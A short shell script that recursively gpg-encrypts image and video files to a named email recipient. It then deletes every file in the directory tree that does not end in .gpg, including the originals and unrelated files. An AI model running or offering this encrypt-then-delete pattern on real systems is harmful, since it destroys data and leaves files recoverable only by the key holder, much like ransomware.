recep='samir.benzammour@gmail.com'

command="gpg -r $recep --encrypt-files *{.png,.jpg,.jpeg,.gif,.mp4,.JPG,.PNG,.mov,.MOV,.JPEG,.MP4,.GIF}"

find . -type d -exec bash -c "cd '{}' && $command" \;

sleep .1

# thanks @datasecs for this tip
find . -type f ! -name '*.gpg' -delete
